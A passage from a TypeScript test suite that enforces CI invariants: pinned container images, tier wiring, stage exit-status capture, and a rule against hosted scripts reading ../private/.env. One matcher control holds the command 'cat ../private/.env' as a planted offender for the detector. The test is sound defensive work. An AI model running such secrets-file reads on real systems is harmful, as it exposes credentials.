			const key = new RegExp(`^ {${indent}}([A-Za-z0-9_.-]+):\\s*(?:#.*)?$`);
			const lines = src.split('\n');
			let inJobs = indent === 0; // GitLab jobs are top-level keys
			const jobs: Array<{ name: string; body: string[] }> = [];
			let orphanMentions = 0;
			for (const line of lines) {
				if (indent > 0 && /^jobs:\s*(?:#.*)?$/.test(line)) {
					inJobs = true;
					continue;
				}
				if (indent > 0 && /^\S/.test(line) && !/^jobs:/.test(line)) inJobs = false;
				const m = inJobs ? line.match(key) : null;
				if (m) {
					jobs.push({ name: m[1] as string, body: [] });
					continue;
				}
				const code = line.trim().startsWith('#') ? '' : line;
				const current = jobs.at(-1);
				if (inJobs && current && (line.trim() === '' || /^\s/.test(line))) current.body.push(line);
				else if (TIER_ROOT.test(code)) orphanMentions++;
			}
			return {
				tierJobs: jobs
					.filter((j) => j.body.some((l) => !l.trim().startsWith('#') && TIER_ROOT.test(l)))
					.map((j) => ({ name: j.name, body: j.body.join('\n') })),
				orphanMentions,
			};
		};
		const IMAGE = `${CI_IMAGE_NAME_PATTERN}@sha256:[0-9a-f]{64}`;
		const githubInImage = (body: string) =>
			new RegExp(
				String.raw`^ {4}container:\s*(?:#.*)?\n(?: {6}.*\n)*? {6}image:\s*${IMAGE}\s*$`,
				'm',
			).test(body) &&
			/^ {4}container:\s*(?:#.*)?\n(?: {6}.*\n)*? {6}options:[^\n]*--user 1001\b/m.test(body);
		const gitlabInImage = (body: string) =>
			new RegExp(String.raw`^ {2}image:\s*\n(?: {4}.*\n)*? {4}name:\s*${IMAGE}\s*$`, 'm').test(
				body,
			) && /^ {2}image:\s*\n(?: {4}.*\n)*? {4}docker:\s*\n {6}user:\s*"1001"\s*$/m.test(body);

		// Controls: a trailing comment, a `run: |` block and `./scripts/…` are all found;
		// an in-image job is told from a bare one; a mention outside any job is counted.
		const d = '0'.repeat(64);
		const control = jobsOf(
			`jobs:\n  a: # note\n    container:\n      image: ${CI_IMAGE_NAME}@sha256:${d}\n      options: --user 1001\n    steps:\n      - run: |\n          bash ./scripts/ci/db_tier.sh\n  b:\n    steps:\n      - run: bash scripts/ci/hermetic.sh\n`,
			2,
		);
		expect(control.tierJobs.map((j) => [j.name, githubInImage(`${j.body}\n`)])).toEqual([
			['a', true],
			['b', false],
		]);
		const glControl = jobsOf(
			`hermetic:\n  image:\n    name: ${CI_IMAGE_NAME}@sha256:${d}\n    docker:\n      user: "1001"\n  script:\n    - bash scripts/ci/hermetic.sh\n`,
			0,
		);
		expect(glControl.tierJobs.map((j) => gitlabInImage(`${j.body}\n`))).toEqual([true]);

		const bare: string[] = [];
		let found = 0;
		const scan = (rel: string, src: string, indent: number, inImage: (b: string) => boolean) => {
			const { tierJobs, orphanMentions } = jobsOf(src, indent);
			expect(orphanMentions, `${rel}: a tier root invoked outside any job the finder sees`).toBe(0);
			for (const job of tierJobs) {
				found++;
				if (!inImage(`${job.body}\n`)) bare.push(`${rel}#${job.name}`);
			}
		};
		for (const { rel, src } of allWorkflows) {
			if (rel.startsWith(join('.github', 'workflows') + '/')) scan(rel, src, 2, githubInImage);
		}
		scan('.gitlab-ci.yml', read('.gitlab-ci.yml'), 0, gitlabInImage);
		// Anti-vacuity: GitHub's hermetic/db/instance + GitLab's hermetic.
		expect(found, 'tier jobs found on both hosts').toBeGreaterThanOrEqual(4);
		expect(
			bare,
			'a job running a tier root outside the locked CI image as uid 1001 (GitHub: container: image + options --user 1001; GitLab: image: name + docker: user "1001"):',
		).toEqual([]);
	});

	// Binds to BOTH tiers: the self-hosted jobs now live in workflows-selfhosted/, and the
	// invariant has to travel with them or it silently stops guarding anything.
	test('self-hosted workflows running parity/verify set ORACLE_REQUIRED: "1"', () => {
		for (const { rel, src } of allWorkflows) {
			if (!targetsSelfHosted(src)) continue;
			const runsOracleGates =
				src.includes('test/parity') ||
				src.includes('scripts/verify.ts') ||
				/\bbun test\b/.test(src);
			if (!runsOracleGates) continue;
			expect(src, `${rel}: self-hosted oracle-gated job must set ORACLE_REQUIRED: "1"`).toContain(
				'ORACLE_REQUIRED: "1"',
			);
		}
	});

	test('the GitHub hermetic jobs and .gitlab-ci.yml invoke the shared hermetic.sh', () => {
		// main.yml (push-to-master hermetic) was DELETED 2026-09-02: ci.yml fires on
		// pull_request + push to every landing branch (tier_wiring leg G), so it was a
		// second hermetic run on the same push carrying no information.
		for (const file of ['.github/workflows/ci.yml', '.gitlab-ci.yml']) {
			expect(read(file), `${file}: hermetic tier must run scripts/ci/hermetic.sh`).toContain(
				'scripts/ci/hermetic.sh',
			);
		}
	});

	// Rule 3c — every tripwire has exactly ONE executing home. NOT_HERMETIC is an
	// ASSIGNMENT to the DB tier, not an excuse: its key set and db_tier.sh's
	// DB_TIER_TRIPWIRES must be EQUAL. Without that equality "excluded from
	// hermetic" still meant "runs nowhere" — and the registration trap was live:
	// wiring a DB gate into HERMETIC_TRIPWIRES to make it run SOMEWHERE reddened
	// its own NOT_HERMETIC row. Now a DB gate registers on the DB tier, where it
	// belongs, and "runs on no tier" is mechanically impossible.
	test('every tripwire runs on exactly one executing tier (hermetic.sh XOR db_tier.sh)', () => {
		const hermetic = new Set(hermeticTripwires());
		const dbTier = dbTierTripwires();
		const verify = verifyTripwires();
		const excluded = verify.filter((t) => !hermetic.has(t));

		for (const t of excluded) {
			expect(
				NOT_HERMETIC.has(t),
				`${t} runs on NO executing tier: it is in verify.ts TRIPWIRES but not in ` +
					'hermetic.sh, and carries no assignment. Wire it into HERMETIC_TRIPWIRES ' +
					'(re-verify it DB-less first, with DB_PORT closed) or assign it to the DB ' +
					'tier: a NOT_HERMETIC row naming the live dependency PLUS the matching ' +
					'DB_TIER_TRIPWIRES entry in scripts/ci/db_tier.sh.',
			).toBe(true);
		}

		// Stale rows are red in both directions.
		const verifySet = new Set(verify);
		for (const t of NOT_HERMETIC.keys()) {
			expect(verifySet.has(t), `NOT_HERMETIC lists ${t}, which is no longer a tripwire`).toBe(true);
			expect(
				hermetic.has(t),
				`NOT_HERMETIC lists ${t} as un-hostable, but hermetic.sh now runs it — delete the row AND its db_tier.sh entry`,
			).toBe(false);
		}

		// THE ASSIGNMENT, exact in both directions. Equality rather than ⊆ is
		// deliberate, and each direction closes a real hole:
		//  - a NOT_HERMETIC key missing from db_tier.sh is a gate excused but not
		//    running — the original hole, back;
		//  - a db_tier.sh entry with no NOT_HERMETIC row is a gate running with no
		//    written reason — the list rots into a dumping ground;
		//  - combined with the hermetic-disjointness check above, equality also
		//    FORBIDS a gate on both tiers. That would burn hosted-Postgres minutes
		//    re-proving what the hermetic tier already proved, and dissolves the
		//    one-stated-home property this rule exists to create. A gate that ever
		//    genuinely needs both (behaviour differs with a DB present) is a
		//    deliberate rule change with its reason written here, not a quiet overlap.
		// Equality also gives D ⊆ verify.ts for free, so the DB tier needs no
		// separate subset rule of its own.
		expect([...dbTier].sort()).toEqual([...NOT_HERMETIC.keys()].sort());
	});

	// The DB tier's WIRING: db_tier.sh alone is a script nothing runs. Before
	// 2026-08-25 these 19 gates ran on NO executing tier precisely because the only
	// DB workflow lived in workflows-selfhosted/, which GitHub does not execute.
	test('the hosted DB tier is wired: db.yml invokes db_tier.sh and declares its service image', () => {
		const src = read('.github/workflows/db.yml');
		expect(src, '.github/workflows/db.yml: the DB tier must run scripts/ci/db_tier.sh').toContain(
			'scripts/ci/db_tier.sh',
		);
		expect(
			/^\s*services:/m.test(src),
			'.github/workflows/db.yml: no services: block — the tier needs its own Postgres; without one the DB gates die at connect and the run is noise, not a gate',
		).toBe(true);
		expect(
			[...src.matchAll(/^\s*image:\s*(\S+)/gm)].length,
			'.github/workflows/db.yml: the services: block declares no image:, so the digest-pin rule would pass over nothing',
		).toBeGreaterThan(0);
	});

	/**
	 * Rule 13 — db_tier.sh must not require ../private/.env. See the header for
	 * the measured breakage: the tier's guard call hard-failed on the file every
	 * GitHub run, so "wired" meant "never reached" from the day the tier landed.
	 */
	test('no hosted tier script contains a command that requires ../private/.env (rule 13)', () => {
		// Positive controls FIRST — a matcher that cannot catch the planted
		// offender proves nothing about a clean scan. Each control is one of the
		// three shapes the matcher claims to catch, plus the two shapes it must
		// NOT catch (the flagged guard call, and a comment discussing the file).
		expect(
			privateEnvOffenders('cat ../private/.env'),
			'matcher control: a direct ../private/.env read must be flagged — the matcher is blind and this rule is vacuous',
		).toHaveLength(1);
		expect(
			privateEnvOffenders('bash scripts/ci/env_guard.sh'),
			'matcher control: a bare env_guard.sh call (check 2 hard-fails on the missing file) must be flagged',
		).toHaveLength(1);
		expect(
			privateEnvOffenders('bash scripts/ci/link_siblings.sh'),
			'matcher control: link_siblings.sh materializes the sibling ../private tree and must be flagged',
		).toHaveLength(1);
		expect(
			privateEnvOffenders('bash scripts/ci/env_guard.sh --no-private-env'),
			'matcher control: the flagged guard call is the SANCTIONED form and must NOT be flagged',
		).toHaveLength(0);
		expect(
			privateEnvOffenders('# the tier needs no ../private/.env'),
			'matcher control: comments must stay free to discuss the file they forswear',
		).toHaveLength(0);

		for (const tier of hostedTierScripts()) {
			expect(
				privateEnvOffenders(effectiveSource(tier)),
				`${tier} (or a script it sources) requires ../private/.env, which never exists on a hosted runner: the tier dies before its gates and they run NOWHERE while reporting as wired — the exact never-reached state measured 2026-08-25. Compose the config in-process (scripts/ci/hosted_env.sh) or pass --no-private-env to env_guard.sh:`,
			).toEqual([]);
		}

		// Guard the guard, both halves: the bun-pin check must still be reached
		// (deleting the env_guard call would also pass the scan above), and
		// env_guard.sh must still HAVE a private-env check for its self-hosted
		// callers — if check 2 were deleted outright, --no-private-env would be
		// skipping nothing and the flag's meaning silently rots.
		for (const tier of suiteBuildingTiers()) {
			expect(
				effectiveSource(tier).includes('env_guard.sh --no-private-env'),
				`${tier} no longer calls env_guard.sh at all — the scan is happy but the bun-pin verification is gone; keep the call with --no-private-env`,
			).toBe(true);
		}
		const guard = read('scripts/ci/env_guard.sh');
		expect(
			guard.includes('REQUIRE_PRIVATE_ENV') && guard.includes('../private/.env'),
			'env_guard.sh lost its skippable private-env check — --no-private-env now skips nothing, so either restore check 2 or retire the flag and this assertion together, deliberately',
		).toBe(true);
	});

	/**
	 * Rule 14 — every DIFFUSION_JOBS_TABLE / DIFFUSION_ACTIVITY_TABLE literal
	 * under scripts/ and test/ satisfies the engine's own seam-guard regex,
	 * which throws AT MODULE LOAD on violation. See the header for the latent
	 * db_tier.sh kill this closes. Three assignment shapes are scanned; an
	 * override reaching the env by a route none of them cover (e.g. a computed
	 * string) is NOT caught here — the engine's load-time throw remains the
	 * backstop, and diffusion_jobs_table_seam.test.ts proves that throw fires.
	 */
	test('diffusion table-override literals under scripts/ and test/ carry the engine prefix (rule 14)', () => {
		const guardRe = diffusionSeamGuardRegex();
		// The engine's guard must still be the prefix guard this rule narrates;
		// if it loosened to something that admits the old dedalo_ts_ci_* names,
		// the extraction "succeeded" but the rule's premise is gone.
		expect(
			guardRe.test('dedalo_ts_test_ci_diffusion_jobs'),
			'the extracted engine regex rejects the canonical dedalo_ts_test_ci_* form — the guard changed shape; re-read schema.ts before touching this rule',
		).toBe(true);
		expect(guardRe.test('dedalo_ts_ci_diffusion_jobs')).toBe(false);

		// The three assignment shapes. Key names are BUILT by concatenation in
		// the controls below so this file's own source never contains a
		// literal-assignment shape for its own scan to trip over.
		const SHAPES: readonly RegExp[] = [
			// shell parameter-expansion default:   : "${<KEY>:=some_table}"
			// (the key is spelled by the alternation — writing the real key in
			// this comment would make this file its own first offender).
			/:\s*"\$\{(DIFFUSION_(?:JOBS|ACTIVITY)_TABLE):=([a-z][a-z0-9_]*)\}"/g,
			// '=' with a QUOTED lowercase literal — TS process.env assignment and
			// the SCRATCH_*_TABLE const indirection the retry-queue /
			// delete-outcomes tests use. The quote is REQUIRED: an unquoted
			// grammar captured the leading identifier of any expression RHS
			// (`= process.env.X` yielded a phantom literal 'process'), so
			// expression assignments are deliberately not this shape's business.
			/\b([A-Z0-9_]*(?:JOBS|ACTIVITY)_TABLE)\s*=\s*'([a-z][a-z0-9_]*)'/g,
			// shell plain assignment, whole line:   KEY=some_table
			/^\s*(?:export\s+)?([A-Z0-9_]*(?:JOBS|ACTIVITY)_TABLE)=([a-z][a-z0-9_]*)\s*$/gm,
			// object/env property, with the optional readEnv(...) ?? fallback the
			// client test server uses (value may sit on the next line).
			/\b(DIFFUSION_(?:JOBS|ACTIVITY)_TABLE)\s*:\s*[\r\n\t ]*(?:readEnv\([^)]*\)\s*\?\?\s*)?'([a-z][a-z0-9_]*)'/g,
		];
		const extract = (src: string): Array<{ key: string; value: string }> => {
			const found: Array<{ key: string; value: string }> = [];
			for (const re of SHAPES) {
				for (const m of src.matchAll(re)) {
					found.push({ key: m[1] as string, value: m[2] as string });
				}
			}
			return found;
		};

		// Positive control: each shape must catch a planted bad literal, or the
		// scan below is a walk over files it cannot read.
		const K = `DIFFUSION_JOBS${'_TABLE'}`;
		const controls = [
			`: "\${${K}:=dedalo_bad}"`,
			`process.env.${K} = 'dedalo_bad'`,
			`${K}=dedalo_bad`,
			`${K}: readEnv('${K}') ?? 'dedalo_bad'`,
		];
		for (const control of controls) {
			const hits = extract(control);
			expect(hits.length, `shape control not matched, the scan is blind to it: ${control}`).toBe(1);
			expect(guardRe.test((hits[0] as { value: string }).value)).toBe(false);
		}
		// Negative control: an expression RHS is not a literal — the unquoted
		// grammar this replaces read `= process.env.X` as a literal 'process'.
		expect(
			extract(`const PRELOAD = process.env.${K};`),
			'the scan captured a phantom literal out of an expression assignment — the quoted-literal grammar regressed',
		).toHaveLength(0);

		// EXEMPT, with its reason: the seam gate's own negative controls are
		// deliberately invalid literals — they exist to prove the engine's
		// load-time refusal fires. The exemption is kept LIVE below: if that file
		// stops containing a non-conforming literal, the row is stale and red.
		const EXEMPT = 'test/unit/diffusion_jobs_table_seam.test.ts';

		const glob = new Glob('**/*.{ts,sh}');
		const offenders: string[] = [];
		let sites = 0;
		let exemptBadLiterals = 0;
		for (const dir of ['scripts', 'test']) {
			for (const rel of glob.scanSync({ cwd: join(repoRoot, dir) })) {
				const file = join(dir, rel).replaceAll('\\', '/');
				for (const { key, value } of extract(read(file))) {
					sites++;
					if (guardRe.test(value)) continue;
					if (file === EXEMPT) {
						exemptBadLiterals++;
						continue;
					}
					offenders.push(`${file}: ${key} = '${value}'`);
				}
			}
		}
		expect(
			offenders,
			`A diffusion table-override literal violates the engine's seam guard ${guardRe} (src/diffusion/jobs/schema.ts / diffusion_delete.ts). The guard THROWS AT MODULE LOAD, so the first gate whose closure imports either module dies at import with this value in the env — the db_tier.sh latent kill of 2026-08-25. Rename the table, never the regex; the prefix is what stops production being redirected to an arbitrary table:`,
		).toEqual([]);
		// Anti-vacuity floor: 12 assignment sites measured 2026-08-25 (db_tier.sh
		// 2, test/preload/session_db.ts 2, scripts/update_drill.ts 2,
		// scripts/client_test_server.ts 2, the seam gate's 2 negative controls,
		// the 2 SCRATCH_ACTIVITY_TABLE consts). Under 8 means the shapes or the
		// walk broke, not that the repo cleaned itself up.
		expect(
			sites,
			`only ${sites} diffusion table-override assignment sites found under scripts/ and test/ — the scan shapes or the directory walk are broken and this rule is passing over nothing`,
		).toBeGreaterThanOrEqual(8);
		expect(
			exemptBadLiterals,
			`${EXEMPT} is exempted as the home of the deliberate BAD literals that prove the engine refusal, but it no longer contains any — the exemption is stale; delete it`,
		).toBeGreaterThan(0);
	});

	/**
	 * RULE 15 — CONCURRENCY MAY NEVER COST A VERDICT.
	 *
	 * Phase 4 of the parallel-test work made three whole-tree stages run at the
	 * same time: typecheck ∥ lint in BOTH `scripts/ci/hermetic.sh` and
	 * `scripts/verify.ts`, and the isolated daemon packages (DAEMON_PACKAGES,
	 * derived — site_builder, server_api/v2, host_agent) concurrently in
	 * hermetic.sh. Every one of those is safe ONLY while both branches are still
	 * waited on and both verdicts still reported. The failure mode is silent and
	 * it is the reason this rule exists rather than a comment: under `set -e` a
	 * first failing background job that is not explicitly waited on aborts the
	 * script, and the SECOND package's result — pass or fail — is never printed.
	 * The tier stays "red", so nobody notices that half its coverage stopped
	 * being reported at all.
	 *
	 * MEASURED, both directions, on Bun 1.4.0: `bun run --parallel a b` exits 1
	 * when a script fails WITH AND WITHOUT `--no-exit-on-error`. The flag does not
	 * swallow the failure; it only lets the other script finish first. So the flag
	 * is required here (a red lint must not pre-empt the typecheck's verdict), and
	 * dropping it is a real regression in what the tier reports.
	 */
	test('parallelised CI stages still wait on and report every verdict (rule 15)', () => {
		const hermeticRaw = readFileSync(join(repoRoot, 'scripts/ci/hermetic.sh'), 'utf8');
		// COMMENTS ARE NOT CODE, and this file's comments DISCUSS the very command
		// the matcher looks for ("`bun run --parallel` runs SCRIPTS, not arbitrary
		// commands"). Scanning raw text flagged the prose explaining the rule —
		// the same shape mock_isolation_tripwire records: a raw read baselines a
		// file for MENTIONING the thing the rule bans. Strip shell comment lines
		// for the CODE assertions; the toContain checks below still read the raw
		// text, since they are looking for a line that must literally be present.
		const hermetic = hermeticRaw
			.split('\n')
			.filter((line) => !line.trimStart().startsWith('#'))
			.join('\n');
		const verify = readFileSync(join(repoRoot, 'scripts/verify.ts'), 'utf8');

		// Positive controls FIRST: a matcher that cannot catch the planted
		// offender proves nothing about a clean scan.
		// Anchored to the START of a line: an INVOCATION, never a mention. The
		// unanchored form flagged this file's own `echo "== hermetic: typecheck +
		// lint (bun run --parallel)"` label and its explanatory comments — a
		// matcher that cannot tell a command from prose about the command reports
		// the rule's own documentation as the violation.
		const parallelWithoutFlag = (text: string): boolean =>
			/^[ \t]*bun run --parallel(?! --no-exit-on-error)/m.test(text);
		expect(
			parallelWithoutFlag('bun run --parallel typecheck lint'),
			'matcher control: a --parallel call missing --no-exit-on-error must be flagged, or this rule is vacuous',
		).toBe(true);
		expect(parallelWithoutFlag('bun run --parallel --no-exit-on-error typecheck lint')).toBe(false);
		// ...and a MENTION in prose or an echo label is not an invocation.
		expect(parallelWithoutFlag('# see `bun run --parallel` for the script runner')).toBe(false);
		expect(parallelWithoutFlag('echo "== typecheck + lint (bun run --parallel)"')).toBe(false);

		// hermetic.sh: the concurrent typecheck+lint keeps the flag that makes
		// both verdicts survive.
		expect(hermeticRaw).toContain(
			'bun run --parallel --no-exit-on-error typecheck lint lint:browser',
		);
		expect(
			parallelWithoutFlag(hermetic),
			"scripts/ci/hermetic.sh runs `bun run --parallel` without --no-exit-on-error: one red stage will pre-empt the other stage's verdict",
		).toBe(false);

		// Both scripts it names must be real package.json scripts — `bun run
		// --parallel` runs SCRIPTS, so a renamed script turns the stage into a
		// "script not found" that `set -e` converts into an unexplained tier failure.
		const pkg = JSON.parse(readFileSync(join(repoRoot, 'package.json'), 'utf8')) as {
			scripts: Record<string, string>;
		};
		for (const name of ['typecheck', 'lint', 'lint:browser']) {
			expect(
				pkg.scripts[name],
				`package.json must define the "${name}" script that hermetic.sh runs in parallel`,
			).toBeString();
		}

		// hermetic.sh: EVERY daemon package is backgrounded, waited on by pid with
		// its status captured, and named in its own RED verdict. The set is the
		// DERIVED one (DAEMON_PACKAGES), never a count typed here. Anchored at line
		// start: a comment MENTIONING the call is not a job.
		const backgroundedIn = (text: string): string[] =>
			[...text.matchAll(/^daemon_gate (\S+) > \S+ 2>&1 &$/gm)].map((m) => m[1] as string);
		expect(
			backgroundedIn('# daemon_gate x > /tmp/y 2>&1 &\ndaemon_gate a/b > /tmp/z.$$ 2>&1 &\n'),
			'matcher control: a commented call is prose, an unindented call is a job',
		).toEqual(['a/b']);
		expect(
			backgroundedIn(hermeticRaw).sort(),
			'hermetic.sh must background exactly the derived daemon packages (every locked package with its own bunfig.toml) — a missing one runs nowhere, an extra one is not a package',
		).toEqual([...DAEMON_PACKAGES].sort());
		// Each job's log is a mktemp'd variable, never a predictable path: a literal
		// `/tmp/x.$$` redirect follows a pre-planted symlink and can be pre-created
		// world-readable (the agent suite prints test bearer/pairing material).
		const unsafeLogsIn = (text: string): string[] =>
			[...text.matchAll(/^daemon_gate \S+ > (\S+) 2>&1 &$/gm)]
				.map((m) => m[1] as string)
				.filter((target) => {
					const v = /^"\$(\w+)"$/.exec(target)?.[1];
					if (v === undefined) return true;
					return !new RegExp(
						`^${v}="\\$\\(mktemp "\\$\\{TMPDIR:-/tmp\\}/[\\w.]+\\.XXXXXX"\\)"$`,
						'm',
					).test(text);
				});
		expect(
			unsafeLogsIn(
				'daemon_gate a > /tmp/z.$$ 2>&1 &\nx_log="$(mktemp "${TMPDIR:-/tmp}/d.XXXXXX")"\ndaemon_gate b > "$x_log" 2>&1 &\ndaemon_gate c > "$y_log" 2>&1 &\n',
			),
			'matcher control: a literal path and an unassigned var are unsafe, a mktemp var is not',
		).toEqual(['/tmp/z.$$', '"$y_log"']);
		expect(
			unsafeLogsIn(hermeticRaw),
			'hermetic.sh daemon job logs must be mktemp-created variables (symlink/pre-create safe), like daemon_gate() own log',
		).toEqual([]);
		const waits = hermeticRaw.match(/wait "\$\w+" \|\| \w+=\$\?/g) ?? [];
		expect(
			waits.length,
			"every backgrounded daemon gate must be waited on with its exit status captured, or `set -e` drops the other package's verdict",
		).toBe(DAEMON_PACKAGES.length);
		for (const pkg of DAEMON_PACKAGES) {
			expect(
				hermeticRaw.includes(`== hermetic: RED in ${pkg} (exit `),
				`hermetic.sh never names ${pkg} in a RED verdict — its exit status is captured and then consulted by nobody`,
			).toBe(true);
		}

		// verify.ts: the concurrent static stages have a PINNED report order, so
		// the summary table cannot reshuffle between runs.
		// The browser-lint budget (P1-17) joined the concurrent static block: `biome
		// check .` cannot see the trees biome.jsonc excludes, so a green lint says
		// nothing about them and the budget is a SEPARATE verdict that must survive
		// alongside the other two.
		// DERIVED, not spelled: the functions the concurrent block awaits are read
		// off the `Promise.all([...])` call, each resolved to the stage NAME its body
		// pushes, and every one of those names must sit in STATIC_STAGE_ORDER (and
		// nothing else may — a name in the order that no concurrent stage reports
		// is a stale row). A pin on the literal line let a fourth stage be added
		// only by rewriting the gate; the rule is about the pairing.
		const concurrent = verify.match(/await Promise\.all\(\[([^\]]+)\]\);/)?.[1];
		expect(
			concurrent,
			'verify.ts no longer runs its static stages under Promise.all',
		).toBeDefined();
		const awaited = [...(concurrent as string).matchAll(/(\w+)\(\)/g)].map((m) => m[1] as string);
		expect(awaited.length, 'the concurrent static block lost its stages').toBeGreaterThanOrEqual(3);
		const stageNameOf = (fn: string): string => {
			const body = verify.match(new RegExp(`async function ${fn}\\(\\)[\\s\\S]*?\\n}`))?.[0] ?? '';
			const names = [...body.matchAll(/results\.push\(\{\s*name:\s*'([A-Za-z0-9_:]+)'/g)].map(
				(m) => m[1] as string,
			);
			expect(new Set(names).size, `${fn}() must report exactly one stage name`).toBe(1);
			return names[0] as string;
		};
		const reported = awaited.map(stageNameOf);
		const order = verify.match(/const STATIC_STAGE_ORDER = \[([^\]]+)\];/)?.[1];
		expect(
			order,
			'verify.ts runs its static stages concurrently, so it must pin their summary order — a verdict table that reshuffles is one people stop reading',
		).toBeDefined();
		const pinned = [...(order as string).matchAll(/'([^']+)'/g)].map((m) => m[1] as string);
		expect(
			[...reported].sort(),
			'every concurrently-run static stage must appear in STATIC_STAGE_ORDER, and nothing else may, or the summary reshuffles',
		).toEqual([...pinned].sort());
		expect(reported).toContain('lint:browser');
	});

	/**
	 * Rule 16 — NO STAGE MAY ABORT THE TIER. Every stage command in
	 * `scripts/ci/hermetic.sh` records its own verdict; none runs bare under
	 * `set -e`.
	 *
	 * WHY THIS IS A SEPARATE RULE FROM 15 (2026-09-21). Rule 15 pins a SPELLING —
	 * that `bun run --parallel` carries `--no-exit-on-error` — and the script's
	 * header narrates the hazard twice more in prose ("a red lint silently
	 * disarmed all 101 invariant gates"). Both were satisfied while the
	 * dependency-audit stage sat there as a bare `bun run scripts/ci/audit.ts`:
	 * under `set -e` a red ratchet exited the tier at that line, and the two
	 * daemon-package gates below it — the ONLY mechanical run
	 * publication/site_builder and publication/server_api/v2 ever get, install +
	 * tsc + suite + coverageThreshold — executed nothing at all. Measured on
	 * master 625249c9 and on the run before it: 15 unaccepted advisories, zero
	 * daemon output in either log, tier red for a reason that named neither
	 * package.
	 *
	 * A rule that pins one stage's flag cannot see the stage that has no flag. So
	 * this one measures the OUTCOME over every stage: an invocation that can fail
	 * must either capture its status (`|| rc=$?`, consulted afterwards) or be an
	 * ENUMERATED exemption with a written reason.
	 */
	test('no hermetic.sh stage aborts the tier — every stage records its verdict (rule 16)', () => {
		const raw = readFileSync(join(repoRoot, 'scripts/ci/hermetic.sh'), 'utf8');

		// The ONE stage that may abort, and why: nothing downstream can run
		// without its dependencies, and it fails before any verdict exists to
		// report. Shrink-only — an entry added here needs its reason.
		const MAY_ABORT: ReadonlyArray<{ fragment: string; reason: string }> = [
			{
				fragment: 'bun install --frozen-lockfile',
				reason:
					'the tier has nothing to run without its dependencies; a failed install is reported by the step itself, and continuing would only produce cascading module-resolution noise',
			},
		];

		/**
		 * Top-level `bun …` invocations: comments stripped, and function bodies
		 * skipped (daemon_gate() runs its own `bun install`/`bun test` inside a
		 * subshell whose status the caller already captures by pid — rule 15).
		 *
		 * A stage is GUARDED in either of the two shapes the script actually uses:
		 * `… || rc=$?` on the line itself, or `… || {` opening a block that
		 * assigns `$?` before it closes. The one-line form alone was not enough —
		 * the typecheck∥lint stage uses the block form, and a matcher that knows
		 * only one spelling would report the tier's best-documented stage as the
		 * offender while still missing a genuinely bare one.
		 */
		const topLevelBunLines = (text: string): { line: string; guarded: boolean }[] => {
			const found: { line: string; guarded: boolean }[] = [];
			const lines = text.split('\n');
			let depth = 0;
			for (let i = 0; i < lines.length; i++) {
				const code = (lines[i] as string).replace(/\s+#.*$/, '');
				if (code.trimStart().startsWith('#')) continue;
				const atTopLevel = depth === 0;
				// Track function bodies by brace balance; good enough for a shell
				// script whose functions are all `name() {` … `}`.
				depth += (code.match(/\{/g) ?? []).length - (code.match(/\}/g) ?? []).length;
				if (depth < 0) depth = 0;
				if (!atTopLevel) continue;
				if (!/^[ \t]*bun (run|test) /.test(code)) continue;
				let guarded = /\|\|\s*\w+=\$\?/.test(code);
				if (!guarded && /\|\|\s*\{\s*$/.test(code)) {
					// Walk the `|| { … }` block and accept an assignment of $? in it.
					for (let j = i + 1; j < lines.length; j++) {
						const body = lines[j] as string;
						if (/^[ \t]*\}/.test(body)) break;
						if (/\w+=\$\?/.test(body)) {
							guarded = true;
							break;
						}
					}
				}
				found.push({ line: code.trim(), guarded });
			}
			return found;
		};
		const unguardedIn = (text: string): string[] =>
			topLevelBunLines(text)
				.filter((s) => !s.guarded)
				.map((s) => s.line);

		// Positive controls FIRST — a matcher that cannot catch the planted
		// offender proves nothing about a clean scan. The planted shape is the
		// exact one that shipped: a bare stage invocation at top level.
		const planted = 'echo "== stage"\nbun run scripts/ci/audit.ts\n';
		expect(
			unguardedIn(planted),
			'matcher control: a bare top-level `bun run` stage must be flagged, or this rule is vacuous',
		).toEqual(['bun run scripts/ci/audit.ts']);
		expect(unguardedIn('bun run scripts/ci/audit.ts || da_rc=$?')).toEqual([]);
		// The BLOCK form records the verdict just as well, and must not be flagged.
		expect(
			unguardedIn(
				'bun run --parallel --no-exit-on-error typecheck lint || {\n\ttier_status=$?\n}\n',
			),
			'the `|| { rc=$? … }` form records the verdict too — flagging it would make the rule unsatisfiable',
		).toEqual([]);
		// ...but a block that records NOTHING is still an abort.
		expect(
			unguardedIn('bun run x || {\n\techo "red"\n}\n'),
			'a `|| { … }` block that never captures $? leaves no verdict behind',
		).toEqual(['bun run x || {']);
		// ...and neither prose nor a body inside a function is an unguarded stage.
		expect(unguardedIn('# bun run scripts/ci/audit.ts explains the ratchet')).toEqual([]);
		expect(
			unguardedIn('daemon_gate() {\n\tbun test\n}\n'),
			'a `bun test` inside a function body is not a tier stage — its caller captures the status',
		).toEqual([]);

		const exempt = (line: string): boolean =>
			MAY_ABORT.some((entry) => line.includes(entry.fragment));
		for (const entry of MAY_ABORT) {
			expect(
				raw.includes(entry.fragment),
				`MAY_ABORT names \`${entry.fragment}\`, which scripts/ci/hermetic.sh no longer runs — a stale exemption is red, so the list cannot rot`,
			).toBe(true);
			expect(
				entry.reason.trim().length,
				`the MAY_ABORT entry for \`${entry.fragment}\` needs a written reason`,
			).toBeGreaterThan(40);
		}

		const stages = topLevelBunLines(raw).map((s) => s.line);
		// Anti-vacuity floor: the tier really does run several stages this way, so
		// a scan that suddenly sees none has stopped reading the script.
		expect(
			stages.length,
			'rule 16 found no top-level `bun` stage in hermetic.sh — the scan, not the script, is what changed',
		).toBeGreaterThanOrEqual(4);

		const unguarded = unguardedIn(raw).filter((line) => !exempt(line));
		expect(
			unguarded,
			'scripts/ci/hermetic.sh stage(s) run bare under `set -e`: a red one EXITS the tier and every stage below it — the daemon package gates included — reports nothing. Capture the status (`|| rc=$?`) and fold it into tier_status, or add a reasoned MAY_ABORT entry',
		).toEqual([]);

		// The captured statuses must actually be CONSULTED. A `|| rc=$?` whose
		// variable nobody reads is a verdict recorded and thrown away.
		//
		// COMMENTS ARE NOT CODE — the same trap rule 15 records, and this scan walked
		// straight into it: hermetic.sh's own comment explaining the pattern ("`||
		// rc=$?` keeps `set -e` from aborting") made the rule demand a `$rc` test for
		// a variable no line ever assigns. Strip comment lines first.
		const codeOnly = raw
			.split('\n')
			.filter((line) => !line.trimStart().startsWith('#'))
			.join('\n');
		const captured = [...codeOnly.matchAll(/\|\|\s*(\w+)=\$\?/g)].map((m) => m[1] as string);
		expect(
			new Set(captured).size,
			'rule 16 found no captured stage statuses — the scan has stopped reading the script',
		).toBeGreaterThanOrEqual(4);
		for (const name of new Set(captured)) {
			expect(
				new RegExp(`\\[ "\\$${name}" -(eq|ne) 0 \\]`).test(codeOnly),
